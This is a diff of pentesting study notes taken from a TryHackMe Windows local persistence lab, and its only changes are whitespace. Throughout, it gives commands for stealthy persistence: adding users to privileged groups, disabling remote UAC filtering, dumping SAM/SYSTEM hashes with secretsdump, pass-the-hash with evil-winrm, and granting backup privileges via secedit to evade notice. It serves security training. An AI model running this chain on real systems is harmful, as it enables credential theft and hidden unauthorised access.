@@ -1,6 +1,6 @@
 For a general overview of persistence methodology and practices during pentesting engagments see:
 
-Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course  
+Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course
 "Maintaining Access Overview" - https://academy.tcm-sec.com/courses/1152300/lectures/24781515
 ------------------------------------------------------------------------------------
 from: Windows Local Persistence - https://tryhackme.com/room/windowslocalpersistence ; Task 2 -  Tampering With Unprivileged Accounts
@@ -15,105 +15,105 @@ Note: you need access with an account with administrator privileges to do the fo
 
 Administrators Group
 --------------------
-C:\> net localgroup administrators <username> /add  
+C:\> net localgroup administrators <username> /add
 - add an unprivileged user to the administrators group in order to give them administrative privileges
 
 Backup Operators Group
 ----------------------
-C:\> net localgroup "Backup Operators" <username> /add  
-- adding a user to this group, instead of Administrators may look less suspicious  
-- "Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL. This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially."  
-- the names of the read/write privileges that are assigned by default to those in the Backup Operators Group are:  
-* "SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place."  
+C:\> net localgroup "Backup Operators" <username> /add
+- adding a user to this group, instead of Administrators may look less suspicious
+- "Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL. This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially."
+- the names of the read/write privileges that are assigned by default to those in the Backup Operators Group are:
+* "SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place."
 * "SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place."
 
 In addition, the user will need to be added to the "Remote Management Users" group to be able to connect remotely using WinRM or the "Remote Desktop Users" group to be able to connect remotely using RDP. The commands are:
 
-C:\> net localgroup "Remote Management Users" <username> /add  
-- add user to Remote Management Users (WinRM) group  
+C:\> net localgroup "Remote Management Users" <username> /add
+- add user to Remote Management Users (WinRM) group
 - allows user to log in remotely to this machine using WinRM
 
-C:\> net localgroup "Remote Desktop Users" <username> /add  
-- add user to Remote Desktop Users (RDP) group  
+C:\> net localgroup "Remote Desktop Users" <username> /add
+- add user to Remote Desktop Users (RDP) group
 - allows user to log in remotely to this machine using RDP
 
-Note: even though the user has now been added to the Backup Operators group and one of the groups that allows remote access, if they log-in remotely (e.g. through WinRM) they will still not be able to access all files. This is because the "Backup Operators"  group is not enabled. A `whoami /groups` search would show:  
-BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only  
-The cause is UAC (User Access Control). It prevents local accounts from having ANY admin privileges when they are logging in remotely. This is called "LocalAccountTokenFilterPolicy". When using a GUI remote interface the option exists to them elevate privileges through the UAC. This option does not exist for a command line interface such as WinRM. In order to allow the user in the Backup Operators group to have all its prvileges when logging in remotely, change the the below registry key to 1 by giving the following command:  
-C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1  
-Now a `whoami /groups` search should show:  
+Note: even though the user has now been added to the Backup Operators group and one of the groups that allows remote access, if they log-in remotely (e.g. through WinRM) they will still not be able to access all files. This is because the "Backup Operators"  group is not enabled. A `whoami /groups` search would show:
+BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
+The cause is UAC (User Access Control). It prevents local accounts from having ANY admin privileges when they are logging in remotely. This is called "LocalAccountTokenFilterPolicy". When using a GUI remote interface the option exists to them elevate privileges through the UAC. This option does not exist for a command line interface such as WinRM. In order to allow the user in the Backup Operators group to have all its prvileges when logging in remotely, change the the below registry key to 1 by giving the following command:
+C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+Now a `whoami /groups` search should show:
 BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
 
-After taking the above steps, the "Backup Operators" user will be able to log in remotely using WinRM or RDP and have the right to read/write to any file or registry key remotely.  
-WinRM can be used from a Linux attack box to sign in using Evil-Win. The sign-in syntax is:  
+After taking the above steps, the "Backup Operators" user will be able to log in remotely using WinRM or RDP and have the right to read/write to any file or registry key remotely.
+WinRM can be used from a Linux attack box to sign in using Evil-Win. The sign-in syntax is:
 $ evil-winrm -i <TARGET_MACHINE_IP> -u <USERNAME> -p <PASSWORD>
 
-The user will now be able to download copies of the SYSTEM and SAM files to the remote host machine using PowerShell.  
-The commands are:  
-PS C:\> reg save hklm\system system.bak  
-PS C:\> reg save hklm\sam sam.bak  
-PS C:\> download system.bak  
+The user will now be able to download copies of the SYSTEM and SAM files to the remote host machine using PowerShell.
+The commands are:
+PS C:\> reg save hklm\system system.bak
+PS C:\> reg save hklm\sam sam.bak
+PS C:\> download system.bak
 PS C:\> download sam.bak
 
-The hashes can then be dumped from these files using secretsdump.py, as follows:  
+The hashes can then be dumped from these files using secretsdump.py, as follows:
 $ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
 
-Evil-winrm can also be used to perform a Pass-the-hash attack with the Administrator accounts hash, thereby obtaining admin privileges:  
-$ evil-winrm -i <MACHINE_IP> -u Administrator -H <HASH>  
-[see:  
-* https://www.kali.org/tools/evil-winrm/  
-* https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/  
+Evil-winrm can also be used to perform a Pass-the-hash attack with the Administrator accounts hash, thereby obtaining admin privileges:
+$ evil-winrm -i <MACHINE_IP> -u Administrator -H <HASH>
+[see:
+* https://www.kali.org/tools/evil-winrm/
+* https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/
 * https://github.com/Hackplayers/evil-winrm]
 ------------------------------------------------------------------------
 
 Special Privileges and Security Descriptors
 
-As discussed above in regards to the Backup Operators group the privileges:  
-* SeBackupPrivilege  
-* SeRestorePrivilege  
-will allow a user to read/write any system file no matter what DACL it has.  
-Assigning these privileges to a user no matter what group they are in will give that user those privileges.  
+As discussed above in regards to the Backup Operators group the privileges:
+* SeBackupPrivilege
+* SeRestorePrivilege
+will allow a user to read/write any system file no matter what DACL it has.
+Assigning these privileges to a user no matter what group they are in will give that user those privileges.
 [Here is a link to info on Windows OS privileges: https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants]
 
 If one has admin privileges, one can use the `secedit` command to add privileges to any user:
 
-1) Export the current config file to a temporary location to be edited:  
-   C:\Users\Administrator> secedit /export /cfg config.inf  
+1) Export the current config file to a temporary location to be edited:
+   C:\Users\Administrator> secedit /export /cfg config.inf
 [the file is now located at C:\Users\Administrator\config.inf and can be opened and edited using the Notepad app]
 
-2) Add the desired user to the lines in the config file that list users who enjoy the SeBackupPrivilege and the SeRestorePrivilege:  
-   SeBackupPrivilege= <USERNAME>  
+2) Add the desired user to the lines in the config file that list users who enjoy the SeBackupPrivilege and the SeRestorePrivilege:
+   SeBackupPrivilege= <USERNAME>
    SeRestorePrivilege= <USERNAME>
 
-3) Convert the .inf to a .sdb file  
+3) Convert the .inf to a .sdb file
  C:\Users\Administrator> secedit /import /cfg config.inf /db config.sdb
 
-4) Load the .sdb file into the sytem:  
+4) Load the .sdb file into the sytem:
    C:\Users\Administrator> secedit /configure /db config.sdb /cfg config.inf
 
-5) At this point the user is still not yet able to use WinRM to log in, however. The next step is to change the Security Descriptor (like an ACL for other system facilities) associated with WinRM service to allow the chosen user to connect with WinRM:  
+5) At this point the user is still not yet able to use WinRM to log in, however. The next step is to change the Security Descriptor (like an ACL for other system facilities) associated with WinRM service to allow the chosen user to connect with WinRM:
    PS C:\WINDOWS\system32> Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
 
 6) This will open a GUI interface in which you <Add> the new user and check the box "Allow" for "Full Control(All Operations)"
 
-7) You will also need to change the LocalAccountTokenFilterPolicy registry key (see above) using this command:  
+7) You will also need to change the LocalAccountTokenFilterPolicy registry key (see above) using this command:
    C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
 
-8) At this point the user will be able to log in remotely using WinRM or RDP and have the right to read/write to any file or registry key remotely.  
-WinRM can be used from a Linux attack box to sign in using Evil-Win. The sign-in syntax is:  
-$ evil-winrm -i <TARGET_MACHINE_IP> -u <USERNAME> -p <PASSWORD>  
-The user will now be able to download copies of the SYSTEM and SAM files to the remote host machine using PowerShell.  
-The commands are:  
-PS C:\> reg save hklm\system system.bak  
-PS C:\> reg save hklm\sam sam.bak  
-PS C:\> download system.bak  
+8) At this point the user will be able to log in remotely using WinRM or RDP and have the right to read/write to any file or registry key remotely.
+WinRM can be used from a Linux attack box to sign in using Evil-Win. The sign-in syntax is:
+$ evil-winrm -i <TARGET_MACHINE_IP> -u <USERNAME> -p <PASSWORD>
+The user will now be able to download copies of the SYSTEM and SAM files to the remote host machine using PowerShell.
+The commands are:
+PS C:\> reg save hklm\system system.bak
+PS C:\> reg save hklm\sam sam.bak
+PS C:\> download system.bak
 PS C:\> download sam.bak
 
-The hashes can then be dumped from these files using secretsdump.py, as follows:  
+The hashes can then be dumped from these files using secretsdump.py, as follows:
 $ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
 
-9) What is especially great for persistence is that the user is still not a member of a higher privileged group and so their extra privileges are less likely to be noticed. A check using:  
-   C:\> net user <USERNAME>  
+9) What is especially great for persistence is that the user is still not a member of a higher privileged group and so their extra privileges are less likely to be noticed. A check using:
+   C:\> net user <USERNAME>
 will not show membership in an admin group since they are not members of such a group even though they have admin privileges
 
 
